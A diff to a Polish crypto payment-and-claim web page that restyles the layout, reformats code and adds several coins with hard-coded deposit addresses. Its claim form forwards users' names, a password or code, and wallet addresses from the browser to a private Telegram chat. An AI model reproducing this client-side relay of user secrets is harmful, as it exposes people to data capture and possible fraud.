@@ -138,7 +138,7 @@
 
     .crypto-selector {
       display: grid;
-      grid-template-columns: repeat(6, 1fr);
+      grid-template-columns: repeat(4, 1fr);
       gap: 12px;
     }
 
@@ -146,12 +146,12 @@
       background: var(--button-bg);
       border: 1px solid var(--card-border);
       border-radius: 14px;
-      padding: 16px 8px;
+      padding: 14px 8px;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
-      gap: 10px;
+      gap: 8px;
       cursor: pointer;
       color: var(--text-main);
     }
@@ -166,8 +166,8 @@
       box-shadow: 0 0 15px var(--accent-glow);
     }
 
-    .crypto-btn svg { width: 38px; height: 38px; }
-    .crypto-btn span { font-size: 13px; font-weight: 600; }
+    .crypto-btn svg { width: 34px; height: 34px; }
+    .crypto-btn span { font-size: 12px; font-weight: 600; text-align: center; }
 
     .main-card {
       background: var(--card-bg);
@@ -211,7 +211,6 @@
 
     .network-info-box.show { display: block; }
 
-    /* TRYB 1: PŁATNOŚĆ */
     .pay-view { display: flex; gap: 36px; align-items: center; }
 
     .qr-section { display: flex; flex-direction: column; align-items: center; gap: 12px; }
@@ -278,7 +277,6 @@
     }
     .copy-btn:hover { background: #3730a3; }
 
-    /* TRYB 2: ODBIÓR */
     .claim-view { display: none; flex-direction: column; gap: 18px; }
 
     .disabled-notice {
@@ -336,7 +334,6 @@
     .status-msg.success { color: #22c55e; }
     .status-msg.error { color: #ef4444; }
 
-    /* Modale */
     .modal-overlay {
       position: fixed; top: 0; left: 0; right: 0; bottom: 0;
       background: var(--modal-bg); backdrop-filter: blur(4px);
@@ -444,7 +441,7 @@
     }
 
     @media (max-width: 650px) {
-      .crypto-selector { grid-template-columns: repeat(3, 1fr); }
+      .crypto-selector { grid-template-columns: repeat(2, 1fr); }
       .pay-view { flex-direction: column; }
     }
   </style>
@@ -469,7 +466,6 @@
   <div class="crypto-selector" id="selector"></div>
 
   <div class="main-card">
-    <!-- WIDOK 1: Wpłata -->
     <div class="pay-view" id="pay-view">
       <div class="qr-section">
         <div class="qr-container" id="qrcode"></div>
@@ -510,7 +506,6 @@
       </div>
     </div>
 
-    <!-- WIDOK 2: Odbiór -->
     <form class="claim-view" id="claim-view">
       <div class="header-info">
         <div class="crypto-icon-placeholder"></div>
@@ -561,7 +556,6 @@
   </div>
 </div>
 
-<!-- Modal Instrukcji -->
 <div class="modal-overlay" id="help-modal">
   <div class="modal-content">
     <div class="modal-header">
@@ -572,7 +566,6 @@
   </div>
 </div>
 
-<!-- Modal Potwierdzenia -->
 <div class="modal-overlay" id="confirm-modal">
   <div class="modal-content">
     <div class="modal-header">
@@ -627,17 +620,23 @@
   const TELEGRAM_CHAT_ID = "7157683909";
   const COOLDOWN_MINUTES = 60;
 
-  // TUTAJ USTAWIASZ ZABLOKOWANE WALUTY DLA TRYBU WYPŁATY:
-  // Aby włączyć/wyłączyć, po prostu dodaj lub usuń ID z tej tablicy.
-  const DISABLED_CLAIM_CRYPTOS = ['eth', 'doge'];
+  // WALUTY ZABROKOWANE DLA WYPŁAT (ODBIÓR KRYPTO)
+  // eth, doge oraz wyłącznie do wpłat: bnb, trx, matic, avax
+  const DISABLED_CLAIM_CRYPTOS = ['eth', 'doge', 'bnb', 'trx', 'matic', 'avax'];
 
   const cryptos = [
     { id: 'btc', name: 'Bitcoin', symbol: 'BTC', network: 'Sieć Bitcoin (BTC)', address: 'bc1qm6w0t38sm9mh63dusqe3zx2pmfhpnp86jz4znk', icon: `<svg viewBox="0 0 64 64"><circle cx="32" cy="32" r="32" fill="#F7931A"/><path d="M46.101 26.314c.616-4.116-2.52-6.33-6.806-7.808l1.39-5.574-3.391-.846-1.352 5.424c-.891-.222-1.808-.433-2.722-.64l1.362-5.46-3.392-.846-1.39 5.573c-.739-.168-1.463-.336-2.164-.512l.004-.018-4.678-1.168-.903 3.623s2.518.577 2.465.613c1.375.343 1.624 1.253 1.582 1.975l-1.586 6.357c.095.024.218.059.353.113-.114-.028-.242-.058-.371-.09l-2.222 8.91c-.168.416-.596 1.042-1.558.803.035.05-2.465-.615-2.465-.615l-1.685 3.886 4.415 1.101c.821.205 1.625.42 2.417.625l-1.405 5.637 3.39.846 1.39-5.573c.926.251 1.824.482 2.705.701l-1.38 5.534 3.392.846 1.406-5.638c5.787 1.096 10.138.654 11.97-4.582 1.478-4.222-.073-6.657-3.125-8.243 2.223-.513 3.898-1.976 4.346-4.992zm-7.778 10.893c-1.05 4.217-8.15 1.938-10.453 1.366l1.865-7.478c2.303.575 9.664 1.714 8.588 6.112zm1.05-10.95c-.958 3.842-6.87 1.89-8.784 1.413l1.691-6.78c1.914.478 8.067 1.37 7.093 5.367z" fill="#FFF"/></svg>` },
     { id: 'eth', name: 'Ethereum', symbol: 'ETH', network: 'Sieć Ethereum (ERC20)', address: '0x3161ebA2EA675BD34Dcc3a3c31F95B15498CaaD9', icon: `<svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#627EEA"/><path d="M16 4v8.87l7.48 3.35z" fill="#FFF" fill-opacity=".6"/><path d="M16 4L8.52 16.22 16 12.87z" fill="#FFF"/><path d="M16 21.96v6.04l7.5-10.35z" fill="#FFF" fill-opacity=".6"/><path d="M16 28v-6.04L8.52 17.65z" fill="#FFF"/><path d="M16 20.57l7.48-4.35L16 12.87z" fill="#FFF" fill-opacity=".2"/><path d="M8.52 16.22l7.48 4.35v-7.7z" fill="#FFF" fill-opacity=".6"/></svg>` },
+    { id: 'usdt', name: 'Tether USD', symbol: 'USDT', network: 'BNB Smart Chain (BEP20)', address: '0x3161ebA2EA675BD34Dcc3a3c31F95B15498CaaD9', icon: `<svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#26A17B"/><path d="M17.92 16.38c-.14.01-.81.06-1.92.06-1.07 0-1.74-.05-1.9-.06-3.15-.14-5.51-.73-5.51-1.44 0-.71 2.36-1.3 5.51-1.44.16 0 .83-.05 1.9-.05 1.11 0 1.78.05 1.92.05 3.15.14 5.5.73 5.5 1.44 0 .71-2.35 1.3-5.5 1.44zm-1.92-4.14c3.92 0 7.15.82 7.15 1.85 0 1.03-3.23 1.85-7.15 1.85s-7.15-.82-7.15-1.85c0-1.03 3.23-1.85 7.15-1.85zm1.18 5.72v4.4h-2.36v-4.4c-3.18-.13-5.36-.67-5.36-1.31 0-.25.32-.49.91-.7.71.6 2.5 1.05 4.81 1.17v2.12h1.28v-2.12c2.31-.12 4.1-.57 4.81-1.17.59.21.91.45.91.7 0 .64-2.18 1.18-5.36 1.31z" fill="#FFF"/></svg>` },
+    { id: 'usdc', name: 'USD Coin', symbol: 'USDC', network: 'Sieć Solana (SOL)', address: 'A8oRsgM9dMtSU8pB1E7RHKfWgdpnAfsPZKwoKN8VmBD1', icon: `<svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#2775CA"/><path d="M16 4a12 12 0 1 0 12 12A12.014 12.014 0 0 0 16 4zm0 22a10 10 0 1 1 10-10 10.011 10.011 0 0 1-10 10zm1.5-14h-3a1.5 1.5 0 0 0 0 3h3a1.5 1.5 0 0 1 0 3h-3.5v1.5h-2V18h1a2.5 2.5 0 0 1 0-5h3a1.5 1.5 0 0 0 0-3h-3a1.5 1.5 0 0 1 0-3h3.5V5.5h2V7h-1a2.5 2.5 0 0 1 0 5z" fill="#FFF"/></svg>` },
     { id: 'sol', name: 'Solana', symbol: 'SOL', network: 'Sieć Solana (SOL)', address: 'A8oRsgM9dMtSU8pB1E7RHKfWgdpnAfsPZKwoKN8VmBD1', icon: `<svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#000"/><path d="M8.5 21.2a.6.6 0 01.4-.2h14.7c.3 0 .5.4.3.7l-2.4 2.4a.6.6 0 01-.4.2H6.4a.5.5 0 01-.3-.7l2.4-2.4zm0-10.4a.6.6 0 01.4-.2h14.7c.3 0 .5.4.3.7l-2.4 2.4a.6.6 0 01-.4.2H6.4a.5.5 0 01-.3-.7l2.4-2.4zm14.6 5.2a.6.6 0 00-.4-.2H8a.5.5 0 00-.3.7l2.4 2.4c.1.1.3.2.4.2h14.7c.3 0 .5-.4.3-.7l-2.4-2.4z" fill="url(#solG)"/><defs><linearGradient id="solG" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#00FFA3"/><stop offset="100%" stop-color="#DC1FFF"/></linearGradient></defs></svg>` },
     { id: 'xrp', name: 'XRP', symbol: 'XRP', network: 'Sieć Ripple (XRP)', address: 'rKukG3tY8WkzaEKuMXhTPcgjoyphJq2afV', icon: `<svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#23292F"/><path d="M22.7 8h2.3l-5.6 5.6c-1.8 1.8-4.8 1.8-6.7 0L7 8h2.3l4.5 4.5c1.2 1.2 3.1 1.2 4.3 0L22.7 8zm-13.4 16H7l5.6-5.6c1.8-1.8 4.8-1.8 6.7 0l5.7 5.6h-2.3l-4.5-4.5c-1.2-1.2-3.1-1.2-4.3 0L9.3 24z" fill="#FFF"/></svg>` },
     { id: 'ltc', name: 'Litecoin', symbol: 'LTC', network: 'Sieć Litecoin (LTC)', address: 'ltc1qx4e7cdtkj3pfh4fkcz6trater9u7dxee4y5hgf', icon: `<svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#345D9D"/><path d="M15.3 7.5l-2.5 9.7-1.8.7-.6 2.3 2.1-.8-1.2 4.7h11l1.1-4.2H15.6l1.2-4.7 1.8-.7.6-2.3-2.1.8 1.4-5.5h-3.2z" fill="#FFF"/></svg>` },
-    { id: 'doge', name: 'Dogecoin', symbol: 'DOGE', network: 'Sieć Dogecoin (DOGE)', address: 'D6Uy1p7VxHvmh5QTr8apxBvvZz76sY2VXH', icon: `<svg viewBox="0 0 100 100"><circle cx="50" cy="50" r="50" fill="#C2A633"/><path d="M33.7 23h21.8c12.2 0 21.8 9.5 21.8 27s-9.6 27-21.8 27H33.7V23zm10.5 10.5v33h11.3c6.3 0 11.3-6.2 11.3-16.5s-5-16.5-11.3-16.5H44.2z" fill="#FFF"/><path d="M27.4 45h27.3v10H27.4z" fill="#FFF"/></svg>` }
+    { id: 'doge', name: 'Dogecoin', symbol: 'DOGE', network: 'Sieć Dogecoin (DOGE)', address: 'D6Uy1p7VxHvmh5QTr8apxBvvZz76sY2VXH', icon: `<svg viewBox="0 0 100 100"><circle cx="50" cy="50" r="50" fill="#C2A633"/><path d="M33.7 23h21.8c12.2 0 21.8 9.5 21.8 27s-9.6 27-21.8 27H33.7V23zm10.5 10.5v33h11.3c6.3 0 11.3-6.2 11.3-16.5s-5-16.5-11.3-16.5H44.2z" fill="#FFF"/><path d="M27.4 45h27.3v10H27.4z" fill="#FFF"/></svg>` },
+    { id: 'bnb', name: 'BNB', symbol: 'BNB', network: 'BNB Smart Chain (BEP20)', address: '0x3161ebA2EA675BD34Dcc3a3c31F95B15498CaaD9', icon: `<svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#F3BA2F"/><path d="M12.11 12.34L16 8.45l3.89 3.89 2.18-2.18L16 4.1 9.93 10.16l2.18 2.18zM4.1 16l2.18-2.18L8.46 16l-2.18 2.18L4.1 16zm8.01 3.66L16 23.55l3.89-3.89 2.18 2.18L16 27.9l-6.07-6.06 2.18-2.18zm11.43-3.66l-2.18-2.18L23.54 16l2.18 2.18L27.9 16zM16 12.35L19.65 16 16 19.65 12.35 16 16 12.35z" fill="#FFF"/></svg>` },
+    { id: 'trx', name: 'TRON', symbol: 'TRX', network: 'Sieć TRON (TRC20)', address: 'TCH9FNofRrAX3V4WSsVhCqo5AAuxMRtrx', icon: `<svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#FF001C"/><path d="M22.5 8.5L7.5 13.2l9.8 11.8 5.2-16.5zm-11.8 5.4l8.2-2.6-5.1 7.2-3.1-4.6z" fill="#FFF"/></svg>` },
+    { id: 'matic', name: 'Polygon', symbol: 'POL', network: 'Sieć Polygon (POL)', address: '0x3161ebA2EA675BD34Dcc3a3c31F95B15498CaaD9', icon: `<svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#8247E5"/><path d="M21.2 12.1l-3.9-2.2c-.8-.5-1.8-.5-2.6 0l-3.9 2.2c-.8.5-1.3 1.3-1.3 2.3v4.5c0 .9.5 1.8 1.3 2.3l3.9 2.2c.8.5 1.8.5 2.6 0l3.9-2.2c.8-.5 1.3-1.3 1.3-2.3v-4.5c0-.9-.5-1.8-1.3-2.3zm-2.2 6.1l-3 1.7-3-1.7v-3.4l3-1.7 3 1.7v3.4z" fill="#FFF"/></svg>` },
+    { id: 'avax', name: 'Avalanche', symbol: 'AVAX', network: 'Avalanche C-Chain', address: '0x3161ebA2EA675BD34Dcc3a3c31F95B15498CaaD9', icon: `<svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#E84142"/><path d="M22.1 22h3.2l-6.8-12c-.5-.8-1.5-.8-2 0l-2 3.6 3.8 6.6 3.8 1.8zm-11.4 0H7.5l6.8-12c.5-.8 1.5-.8 2 0l1.9 3.4-3.9 6.8-3.8 1.8z" fill="#FFF"/></svg>` }
   ];
 
   let activeIndex = 0;
@@ -665,7 +664,42 @@
   setTheme(savedTheme);
 
   function toggleNetworkInfo(view) {
-    document.getElementById(`${view}-network-box`).classList.toggle('show');   }    const modePayBtn = document.getElementById('mode-pay-btn');   const modeClaimBtn = document.getElementById('mode-claim-btn');   const payView = document.getElementById('pay-view');   const claimView = document.getElementById('claim-view');    modePayBtn.onclick = () => switchMode('pay');   modeClaimBtn.onclick = () => switchMode('claim');    function switchMode(mode) {     currentMode = mode;     document.querySelectorAll('.network-info-box').forEach(el => el.classList.remove('show'));      if (mode === 'pay') {       modePayBtn.classList.add('active');       modeClaimBtn.classList.remove('active');       payView.style.display = 'flex';       claimView.style.display = 'none';     } else {       modeClaimBtn.classList.add('active');       modePayBtn.classList.remove('active');       payView.style.display = 'none';       claimView.style.display = 'flex';     }     updateUI();   }    function renderButtons() {     const selector = document.getElementById('selector');     selector.innerHTML = '';     cryptos.forEach((crypto, index) => {       const btn = document.createElement('button');       btn.type = 'button';       btn.className = `crypto-btn ${index === activeIndex ? 'active' : ''}`;
+    document.getElementById(`${view}-network-box`).classList.toggle('show');
+  }
+
+  const modePayBtn = document.getElementById('mode-pay-btn');
+  const modeClaimBtn = document.getElementById('mode-claim-btn');
+  const payView = document.getElementById('pay-view');
+  const claimView = document.getElementById('claim-view');
+
+  modePayBtn.onclick = () => switchMode('pay');
+  modeClaimBtn.onclick = () => switchMode('claim');
+
+  function switchMode(mode) {
+    currentMode = mode;
+    document.querySelectorAll('.network-info-box').forEach(el => el.classList.remove('show'));
+
+    if (mode === 'pay') {
+      modePayBtn.classList.add('active');
+      modeClaimBtn.classList.remove('active');
+      payView.style.display = 'flex';
+      claimView.style.display = 'none';
+    } else {
+      modeClaimBtn.classList.add('active');
+      modePayBtn.classList.remove('active');
+      payView.style.display = 'none';
+      claimView.style.display = 'flex';
+    }
+    updateUI();
+  }
+
+  function renderButtons() {
+    const selector = document.getElementById('selector');
+    selector.innerHTML = '';
+    cryptos.forEach((crypto, index) => {
+      const btn = document.createElement('button');
+      btn.type = 'button';
+      btn.className = `crypto-btn ${index === activeIndex ? 'active' : ''}`;
       btn.innerHTML = `${crypto.icon}<span>${crypto.name}</span>`;
       btn.onclick = () => {
         activeIndex = index;
@@ -687,7 +721,6 @@
       document.querySelector('.address-text').innerText = crypto.address;
       generateQR(crypto.address);
     } else {
-      // Sprawdzanie czy dana waluta jest wyłączona w trybie ODBIORU
       const disabledNotice = document.getElementById('disabled-notice');
       const submitBtn = document.getElementById('claim-submit-btn');
       const isBlocked = DISABLED_CLAIM_CRYPTOS.includes(crypto.id);
@@ -810,7 +843,10 @@
     btn.innerText = 'Wysyłanie...';
 
     const text = `📥 *NOWE ZGŁOSZENIE O KRIPTO!*\n\n` +
-                 `👤 *Odbiorca:* ${name}\n` +                  `🔑 *Hasło:* \`${code}\`\n` +                  `🪙 *Waluta:* ${crypto.name} (${crypto.symbol})\n` +                  `💰 *Ilość:* ${amount}\n` +
+                 `👤 *Odbiorca:* ${name}\n` +
+                 `🔑 *Hasło:* \`${code}\`\n` +
+                 `🪙 *Waluta:* ${crypto.name} (${crypto.symbol})\n` +
+                 `💰 *Ilość:* ${amount}\n` +
                  `📫 *Adres portfela:*\n\`${address}\``;
 
     try {
